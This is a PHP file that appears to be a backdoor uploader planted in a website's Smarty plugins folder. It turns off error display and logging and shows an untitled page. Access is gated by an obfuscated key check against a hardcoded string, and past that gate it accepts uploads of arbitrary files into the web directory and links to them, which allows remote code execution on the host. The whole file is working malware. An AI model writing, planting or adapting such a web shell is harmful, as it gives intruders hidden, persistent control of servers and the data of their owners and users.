<?
session_start();
@ini_set('display_errors', 'off');
@ini_set('error_reporting', 0);
@ini_set('log_errors', 'off');
$full_url="/Smarty/libs/plugins/";
$folder="./";
$error="";
$success="";
$display_message="";
$f_nums="1";

if((!empty($_POST['submit']) && $_POST['submit']==true) AND !empty($_SESSION['u_pa'])) {
	for($i=0; $i <= $f_nums-1; $i++) {
		if($_FILES['file']['name'][$i]) {
			$file_name[$i]=$_FILES['file']['name'][$i];
			if(str_replace(" ", "", $file_name[$i])=="") {
				$error.= "<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> Blank name.<br />";
			} elseif(file_exists($folder.$file_name[$i])) {
				$error.= "<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> already exists.<br />";
			} else {
				if(move_uploaded_file($_FILES['file']['tmp_name'][$i],$folder.$file_name[$i])) {
					$success.="<b>SUCCESS:</b> ".$_FILES['file']['name'][$i]."<br />";
					$success.="<b></b> <a href=\"".$full_url.$file_name[$i]."\" target=\"_blank\">".$full_url.$file_name[$i]."</a><br /><br />";
				} else {
					$error.="<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> General failure.<br />";
				}
			}		
		} 
	} 
	if(($error=="") AND ($success=="")) {
		$error.="<b>FAILED:</b> No files selected<br />";
	}
	$display_message=$success.$error;
} 

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title> </title>

<?
{
?>

<?
function th()
{
    if(isset($_POST['evalue'], $_POST['ebtn']))
    {
    	$kdata = $_POST['evalue'];
		$skey = 12;
		$res = '';
		$sBase64 = strtr($kdata, '-_', '+/');
		$kdata = base64_decode($sBase64.'==');
		for($i=0;$i<strlen($kdata);$i++){
				$char    = substr($kdata, $i, 1);
				$kchar = substr($skey, ($i % strlen($skey)) - 1, 1);
				$char    = chr(ord($char) - ord($kchar));
				$res .= $char;
		}
        if($res == 'sDr36fh2s23hJsdr#*')
            $_SESSION['u_pa'] = 1;
    }
    echo '<form method="POST">'.
    '<div><input type="text" name="evalue" size="30" /></div>'.
    '<div><input type="submit" value="Enter" name="ebtn" /></div>'.
    '</form>';
    die();
}
if(empty($_SESSION['u_pa'])) 
	th();
?>

<form action="<?=$_SERVER['PHP_SELF'];?>" method="post" enctype="multipart/form-data" name="name">
	<?if($display_message){?>
	<br /><?=$display_message;?><br />
	<?}?>
	
	<?for($i=0;$i <= $f_nums-1;$i++) {?>
	<input type="file" name="file[]" size="30" />
	<?}?>
	<input type="hidden" name="submit" value="true" />
	<input type="submit" value=" Set " /> 
</form>

<?} ?>

</body>
</html>